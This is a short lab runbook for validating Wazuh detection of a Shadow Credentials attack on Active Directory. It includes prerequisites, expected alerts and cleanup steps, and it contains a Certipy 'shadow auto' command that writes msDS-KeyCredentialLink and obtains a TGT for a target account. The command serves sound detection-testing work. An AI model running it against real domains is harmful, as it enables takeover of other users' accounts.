# Shadow Credentials — command validation

## Objective

Validate Wazuh detection of `msDS-KeyCredentialLink` modification during Certipy Shadow Credentials (`T1098.005`).

## Criteria

- Linux attacker host can reach DC LDAP/Kerberos.
- `certipy` installed on Linux attacker host.
- Operator account has write permission to target user's `msDS-KeyCredentialLink`.
- DC supports PKINIT and can issue a TGT from certificate authentication.
- DC Security auditing records Event ID `5136`.
- Target user has Success SACL auditing for `msDS-KeyCredentialLink` WriteProperty.
- Wazuh DC agent collects Security events.
- Wazuh manager rule file `shadow_credentials_detection.xml` is loaded.

## Command

```bash
certipy shadow auto \
  -u '<operator>@simulation.local' \
  -p '<operator-password>' \
  -account '<target-user>' \
  -dc-ip '<dc-ip>' \
  -target 'DC01.simulation.local'
```

## Expected result

```text
Key Credential added
TGT received
Old Key Credentials restored
```

## Expected Wazuh evidence

| Rule | Level | Meaning |
|---:|---:|---|
| 100451 | 15 | `5136` / `msDS-KeyCredentialLink` value added (`%%14674`) |
| 100452 | 5 | `5136` / `msDS-KeyCredentialLink` value restored/deleted (`%%14675`) |

## Cleanup

Certipy auto-restores old Key Credentials. Remove generated credential-cache artifacts after evidence validation. Do not store certificate, cache, password, or recovered hash in Git.
